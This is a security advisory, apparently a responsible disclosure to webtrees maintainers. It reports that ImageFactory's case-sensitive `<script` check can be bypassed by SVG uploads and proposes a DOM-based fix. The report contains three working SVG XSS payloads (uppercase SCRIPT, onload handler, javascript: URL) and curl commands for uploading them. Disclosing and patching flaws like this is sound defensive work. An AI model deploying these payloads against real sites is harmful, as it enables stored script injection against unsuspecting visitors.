<!-- SPDX-License-Identifier: GPL-3.0-or-later -->

# SEC-AUDIT-001 — SVG Stored XSS: Bypassable `<script` Substring Filter in ImageFactory

## Summary

| Field | Value |
|---|---|
| **Affected file** | `app/Factories/ImageFactory.php` (line 270) |
| **Affected version** | webtrees `main` at commit `c338276a5a` (post-2.2.5) and all prior versions containing the `str_contains` check |
| **CWE** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| **Initial severity estimate** | **Low** (defense-in-depth gap) |
| **CVSS 3.1 estimate** | 3.1 — Low (AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N) |
| **Required privilege** | Editor role (for upload); Visitor role (for triggering the stored payload) |
| **Mitigating factor** | The `content-security-policy: script-src none;frame-src none` header set by `imageResponse()` blocks execution in all modern browsers that honor CSP Level 2+ |

> **Note:** This is an initial severity estimate by the reporter. Final classification is at the maintainer's discretion.

## Description

The server-side SVG sanitization in `ImageFactory::imageResponse()` uses a case-sensitive substring check:

```php
if ($mime_type === 'image/svg+xml' && str_contains($data, '<script')) {
    return $this->replacementImageResponse('XSS');
}
```

PHP's `str_contains()` is case-sensitive. This check is trivially bypassed by three payload families:

1. **Case variation:** `<SCRIPT>alert(1)</SCRIPT>` — `str_contains('<SCRIPT...', '<script')` returns `false`, but browsers parse SVG/HTML tag names case-insensitively.
2. **Event handler attributes:** `<svg onload="alert(1)"/>` — contains no `<script` substring at all.
3. **`javascript:` URLs:** `<a xlink:href="javascript:alert(1)">` — likewise no `<script` substring.

All three bypass the L1 filter and are served to the browser with `Content-Type: image/svg+xml`. However, the existing `content-security-policy: script-src none;frame-src none` header (L2 defense) blocks actual script execution in modern browsers.

This is a **defense-in-depth gap**, not a directly exploitable vulnerability in current browsers. It becomes exploitable if:
- The CSP header is removed or weakened in a future change
- A user's browser does not honor CSP Level 2 (older or non-standard browsers)

## Reproduction Steps

### Prerequisites

- A webtrees instance at `$BASE_URL` (e.g., `http://localhost:8080`)
- An account with **Editor** role in at least one tree
- A valid CSRF token (`_csrf`) and session cookie (obtain by logging in)

### Step 1: Upload a malicious SVG

Save the following as `case_bypass.svg` (or use the file from `payloads/h1_case_bypass.svg`):

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
  <SCRIPT type="text/javascript">
    alert('XSS via case bypass');
  </SCRIPT>
</svg>
```

Upload via the "Add a media file" form or via curl:

```bash
# Log in and capture cookies
curl -c cookies.txt -b cookies.txt \
  "$BASE_URL/index.php?route=/login" \
  -d "username=editor_user&password=editor_pass&_csrf=$CSRF_TOKEN"

# Upload the SVG as a media file
curl -b cookies.txt \
  "$BASE_URL/index.php?route=/tree/tree1/create-media-object" \
  -F "file=@case_bypass.svg;type=image/svg+xml" \
  -F "file_location=upload" \
  -F "folder=" \
  -F "auto=0" \
  -F "new_file=case_bypass.svg" \
  -F "_csrf=$CSRF_TOKEN"
```

### Step 2: Retrieve the stored SVG

As any visitor (no authentication required), request the media file:

```bash
curl -v "$BASE_URL/index.php?route=/media-file/case_bypass.svg"
```

### Step 3: Observe the bypass

**Before fix:** The response contains the full `<SCRIPT>` tag in the body with `Content-Type: image/svg+xml`. The `str_contains` filter did not fire because the payload uses uppercase `<SCRIPT>`.

**After fix:** The response returns a placeholder SVG with an `x-image-exception: SVG image blocked due to XSS.` header. The original payload is not present in the response body.

### Alternative payloads

The same upload/retrieve flow works with these additional bypass variants:

**Event handler (no `<script` tag at all):**
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"
     onload="alert('XSS via event handler')">
  <rect width="100" height="100" fill="blue"/>
</svg>
```

**`javascript:` URL (requires user click):**
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="200" height="100">
  <a xlink:href="javascript:alert('XSS via javascript URL')">
    <rect width="200" height="100" fill="green"/>
    <text x="10" y="60" font-size="20" fill="white">Click me</text>
  </a>
</svg>
```

## Fix

The attached patch (`0001-ImageFactory-replace-fragile-script-substring-filter.patch`) replaces the `str_contains` check with a DOM-based SVG walker (`svgContainsActiveContent()`):

- Parses the SVG with `DOMDocument` using `LIBXML_NONET` (prevents XXE/SSRF)
- Recursively walks all elements, rejecting `<script>`, `<foreignObject>`, `<iframe>`, `<object>`, `<embed>`, `<handler>` (case-insensitive)
- Rejects any `on*` event-handler attributes
- Rejects `javascript:` URLs in any attribute (with whitespace normalization)
- Malformed XML is blocked conservatively

Legitimate SVGs (no active content) pass through unchanged. The existing CSP header remains as the primary defense layer.

## Included Files

| File | Description |
|---|---|
| `0001-ImageFactory-replace-fragile-script-substring-filter.patch` | `git format-patch` of the fix (includes test-relevant regression commit message) |
| `payloads/h1_case_bypass.svg` | Case-variation bypass: `<SCRIPT>` |
| `payloads/h2_onload_handler.svg` | Event-handler bypass: `onload=` |
| `payloads/h3_javascript_url.svg` | `javascript:` URL bypass |
| `payloads/h4_legitimate_control.svg` | Legitimate SVG (control case, must pass through unchanged) |
